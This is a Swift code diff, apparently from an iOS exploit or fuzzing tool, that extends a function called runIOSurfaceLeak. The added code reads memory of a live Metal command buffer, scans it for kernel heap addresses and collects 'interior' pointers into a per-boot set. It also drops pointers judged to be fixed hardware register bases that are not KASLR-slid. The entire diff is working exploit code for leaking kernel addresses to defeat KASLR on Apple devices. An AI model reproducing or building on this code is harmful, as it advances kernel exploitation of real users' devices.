@@ -1835,6 +1835,8 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             t.write(uint4(0xAB, 0xCD, 0xEF, 0x42), g);
         }
         """
+        var cmdScanBuf: [UInt8] = []
+        var cmdScanUAddr: UInt = 0
         do {
             let opt = MTLCompileOptions()
             let lib = try device.makeLibrary(source: src, options: opt)
@@ -1858,6 +1860,16 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             enc.endEncoding()
             cmd.commit()
             cmd.waitUntilCompleted()
+            // Capture cmd memory while still alive — per-context boot-variant KHEAP ptrs
+            let tmpCmdAddr = UInt(bitPattern: Unmanaged.passUnretained(cmd as AnyObject).toOpaque())
+            cmdScanUAddr = tmpCmdAddr
+            var tmpCmdBuf = [UInt8](repeating: 0, count: 65536)
+            var tmpCmdOut: vm_size_t = 0
+            let cmdReadKr: kern_return_t = tmpCmdBuf.withUnsafeMutableBytes { b in
+                vm_read_overwrite(mach_task_self_, vm_address_t(tmpCmdAddr), vm_size_t(65536),
+                                  vm_address_t(bitPattern: b.baseAddress!), &tmpCmdOut)
+            }
+            if cmdReadKr == 0 { cmdScanBuf = Array(tmpCmdBuf.prefix(Int(tmpCmdOut))) }
         } catch {
             step("GPU err: \(error)"); surface.unlock(options: [], seed: nil); completion(); return
         }
@@ -1913,6 +1925,33 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         scanAddr("metal_dev_0",   deviceUAddr,           131072)
         scanAddr("metal_dev_1",   deviceUAddr + 131072,  131072)
         scanAddr("metal_queue_0", queueUAddr,            65536)
+
+        // Scan MTLCommandBuffer user-space object — per-context, contains boot-variant KHEAP ptrs
+        // Buffer was read while cmd was alive (inside do-block above)
+        if cmdScanUAddr != 0 && !cmdScanBuf.isEmpty {
+            var cmdKheapCount = 0
+            step("metal_cmd_scan: addr=0x\(String(cmdScanUAddr, radix: 16)) size=\(cmdScanBuf.count)")
+            for qw in 0..<(cmdScanBuf.count / 8) {
+                var val: UInt64 = 0
+                for b in 0..<8 { val |= UInt64(cmdScanBuf[qw*8+b]) << (b*8) }
+                guard val >= 0xFFFFFE0000000000 && val <= 0xFFFFFEFFFFFFFFFF else { continue }
+                let b0 = UInt8(val & 0xFF)
+                guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
+                guard (val & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
+                let off = qw * 8
+                step("  metal_cmd[+0x\(String(off, radix: 16))] = 0x\(String(val, radix: 16)) [KHEAP]")
+                // Only accumulate interior pointers (non-zero low 4 bytes) — hardware register bases always end in 00000000
+                if val & 0xFFFFFFFF != 0 {
+                    _thisBootKheap.insert(val)
+                    cmdKheapCount += 1
+                }
+            }
+            if cmdKheapCount > 0 {
+                step("metal_cmd_accum: \(cmdKheapCount) interior KHEAP inserts (total set=\(_thisBootKheap.count))")
+            } else {
+                step("metal_cmd_scan: no interior KHEAP found")
+            }
+        }
 
         let base = UInt(bitPattern: baseAddr)
 
@@ -2116,12 +2155,11 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 let b0 = UInt8(v & 0xFF)
                 guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
                 guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
-                _thisBootKheap.insert(v)
                 mdAccumCount += 1
             }
         }
         if mdAccumCount > 0 {
-            step("metal_dev_accum: \(mdAccumCount) KHEAP inserts from device scan (total set=\(_thisBootKheap.count))")
+            step("metal_dev_accum: \(mdAccumCount) fixed KHEAP found in device obj (not accumulated — hardware register bases, not KASLR-slid)")
         }
 
         _iosurfRunCount += 1
